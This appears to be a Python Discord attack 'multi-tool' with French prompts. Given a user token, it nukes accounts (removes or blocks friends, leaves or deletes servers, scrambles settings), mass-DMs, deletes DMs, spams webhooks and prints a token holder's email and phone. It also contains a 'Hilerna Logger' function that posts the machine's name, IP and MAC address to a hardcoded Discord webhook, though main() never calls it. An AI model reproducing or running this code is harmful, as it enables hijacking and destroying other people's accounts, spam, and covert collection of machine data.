import os
import socket
import json
import requests
import uuid
import time
import sys
import base64

def send_system_info_to_discord():
    def get_mac():
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        except Exception as e:
            mac = "00:00:00:00:00:00"
        return mac

    pc_name = os.environ['COMPUTERNAME']
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = get_mac()

    webhook_url = "https://discord.com/api/webhooks/1139251412178575432/DAYYJTPN6QKLOeQKk4h5FgG8rqyKgIN1LYkyB1fzAJ_kF7Tvsunbvx3gpXTh0jM6TksU"

    embed_data = {
        "title": "Hilerna Logger",
        "description": f"`Nom du PC:` ```{pc_name}```\n`Adresse IP` ```{ip_address}```\n`Adresse MAC` ```{mac_address}```",
        "color": 15597816,
        "footer": {
            "text": "https://github.com/hilerna",
            "icon_url": "https://media.discordapp.net/attachments/1138864811036385282/1139247676530102324/ppp.png"
        }
    }

    payload = {
        "content": None,
        "embeds": [embed_data],
        "attachments": []
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        pass

def display_menu():
    menu = """
┌─────────────────────────────────────┐ ┌────────────────────────────────────┐
│  [1] Webhook Spammer                │ │  [6] Dm Deleter                    │
│  [2] Webhook Deleter                │ │  [7] Mass Dm                       │
│  [3] Account Nuker                  │ │  [8] Token Info                    │
│  [4] Seizure Mode                   │ │  [E] Exit                          │
│  [5] Enable Seizure Mode            │ │  [By] https://github.com/Hilerna   │
└─────────────────────────────────────┘ └────────────────────────────────────┘
"""
    print(menu)

def webhooks_spammer():
    webhook_url = input("L'url du webhooks: ")
    message = input("Message: ")
    cooldown = float(input("Cooldown (secondes): "))
    
    while True:
        try:
            response = requests.post(webhook_url, json={"content": message})
            if response.status_code == 204:
                print("Message Envoyé")
            else:
                print(f"Erreur lors de l'envoie du message: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        
        time.sleep(cooldown)

def webhook_deleter():
    webhook = input("L'url du webhook à supprimer: ")
    
    requests.delete(webhook)
    check = requests.get(webhook)
    
    if check.status_code == 404:
        print("Webhooks suprimer avec succés")
    elif check.status_code == 200:
        print("Erreur lors de la supression du webhooks")

def account_nuker():
    token = input("Entrez le token du compte a nuke: ")
    remove_friends = input("Supprimer tous les amis (Y/n): ")
    block_friends = input("Bloquer tous les amis (Y/n): ")
    leave_servers = input("Quitter tous les serveurs (Y/n): ")
    delete_servers = input("Supprimer tous les serveurs (Y/n): ")
    settings_troll = input("Dérégler les paramètres (y/N): ")

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }

    remove_friends = True if remove_friends.lower() == "y" else False
    block_friends = True if block_friends.lower() == "y" else False
    leave_servers = True if leave_servers.lower() == "y" else False
    delete_servers = True if delete_servers.lower() == "y" else False
    settings_troll = False if settings_troll.lower() == "n" else True

    if remove_friends or block_friends:
        friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        for friend in friends.json():
            id = friend['id']
            if block_friends:
                requests.put(f'https://discord.com/api/v9/users/@me/relationships/{id}', json={'type': 2}, headers=headers)
            elif remove_friends:
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers=headers)

    if leave_servers or delete_servers:
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
        user_settings = requests.get('https://discord.com/api/v9/users/@me/settings', headers=headers)
        whitelisted = []

        for guild in guilds.json():
            id = guild['id']
            if leave_servers and guild['owner'] == False:
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', json={'lurking': 'false'}, headers=headers)
            elif delete_servers and guild['owner'] == True:
                requests.post(f'https://discord.com/api/v9/guilds/{id}/delete', headers=headers)

    if settings_troll:
        settings_url = 'https://discord.com/api/v9/users/@me/settings-proto/1'

        settings_lol = {
            'CgIYGCILCgkQAAAAAAAAACAyBYoBAggBYg4KBwoFZW4tVVMSAwjwAWoECAEQAXInChkKEApQxMc1H1AOZDBCKwjhYQ0SBQjvmJEuCgoKCFJQxIabOkgO',
            'CgIYGiILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgVlbi1VUxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'CgIYGyILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgV6aC1UVxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'Yg4KBwoFemgtVFcSAwjwAWoECAIQAQ==',
            'agQIAhAB'
        }

        for setting in settings_lol:
            requests.patch(settings_url, headers=headers, json={"settings": setting})

def seizure_mode():
    token = input("Entrez le token du compte a seizure ")
    settings_troll = input("Dérégler les paramètres (y/N): ")

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }

    settings_troll = False if settings_troll.lower() == "n" else True

    if settings_troll:
        settings_url = 'https://discord.com/api/v9/users/@me/settings-proto/1'
        settings_lol = {
            'CgIYGCILCgkQAAAAAAAAACAyBYoBAggBYg4KBwoFZW4tVVMSAwjwAWoECAEQAXInChkKEApQxMc1H1AOZDBCKwjhYQ0SBQjvmJEuCgoKCFJQxIabOkgO',
            'CgIYGiILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgVlbi1VUxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'CgIYGyILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgV6aC1UVxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'Yg4KBwoFemgtVFcSAwjwAWoECAIQAQ==',
            'agQIAhAB'
        }

        for setting in settings_lol:
            requests.patch(settings_url, headers=headers, json={"settings": setting})

def enable_seizure_mode():
    print("Enable Seizure Mode selected")

    token = input("Entrez le Token discord: ")
    settings_troll = input("Désactiver le seizure mode? (Y/n): ")

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }

    settings_troll = True if settings_troll.lower() == "y" else False

    if settings_troll:
        settings_url = 'https://discord.com/api/v9/users/@me/settings-proto/1'
        settings_lol = {
            'CgIYGCILCgkQAAAAAAAAACAyBYoBAggBYg4KBwoFZW4tVVMSAwjwAWoECAEQAXInChkKEApQxMc1H1AOZDBCKwjhYQ0SBQjvmJEuCgoKCFJQxIabOkgO',
            'CgIYGiILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgVlbi1VUxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'CgIYGyILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgV6aC1UVxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=',
            'Yg4KBwoFemgtVFcSAwjwAWoECAIQAQ==',
            'agQIAhAB'
        }

        for setting in settings_lol:
            requests.patch(settings_url, headers=headers, json={"settings": ""})

def dm_deleter():
    token = input("Entrez votre token Discord: ")
    
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }
    
    dm_channels = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
    
    for channel in dm_channels.json():
        if channel['type'] == 1: 
            channel_id = channel['id']
            messages = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers)
            
            for message in messages.json():
                message_id = message['id']
                requests.delete(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}', headers=headers)
                
    print("Tous les messages de vos conversations privées (DM) ont été supprimés.")

def mass_dm():
    token = input("Entrez votre token discord: ")
    message = input("Entrez le message que vous souhaitez envoyer: ")
    
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }
    
    friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
    
    for friend in friends.json():
        if friend['type'] == 1:
            user_id = friend['id']
            
            dm_data = {
                "recipient_id": user_id,
                "content": message
            }
            
            response = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json=dm_data)
            
            if response.status_code == 200:
                dm_channel_id = response.json()['id']
                dm_message_data = {
                    "content": message
                }
                
                requests.post(f'https://discord.com/api/v9/channels/{dm_channel_id}/messages', headers=headers, json=dm_message_data)
                
    print("Le message a été envoyé à tous vos amis.")

def token_info():
    token = input("Entrez le token Discord: ")
    
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US",
        "authorization": token,
        "dnt": "1",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
    }
    
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    
    if response.status_code == 200:
        user_data = response.json()
        print("Informations sur le jeton d'authentification Discord:")
        print("Nom d'utilisateur:", user_data.get("username"))
        print("ID d'utilisateur:", user_data.get("id"))
        print("Avatar:", user_data.get("avatar"))
        print("Email:", user_data.get("email"))
        print("Numéro de téléphone:", user_data.get("phone"))
        print("Compte vérifié:", user_data.get("verified"))
        print("Nitro:", user_data.get("premium_type"))
        print("Bannissement:", user_data.get("ban"))
    else:
        print("Erreur lors de la récupération des informations.")

def exit_program():
    print("Fermeture du programme...")
    sys.exit(0)

def main():
    display_menu()
    option = input("Choisis l'option que tu veux utiliser:")

    if option == '1':
        webhooks_spammer()
    elif option == '2':
        webhook_deleter()
    elif option == '3':
        account_nuker()
    elif option == '4':
        seizure_mode()
    elif option == '5':
        enable_seizure_mode()
    elif option == '6':
        dm_deleter()
    elif option == '7':
        mass_dm()
    elif option == '8':
        token_info()
    elif option == 'E':
        exit_program()
    else:
        print("Option invalide")
        
        restart = input("Voulez-vous revenir au menu principal ? (Y/n): ")
        if restart.lower() != 'y':
            exit_program()

if __name__ == "__main__":
    main()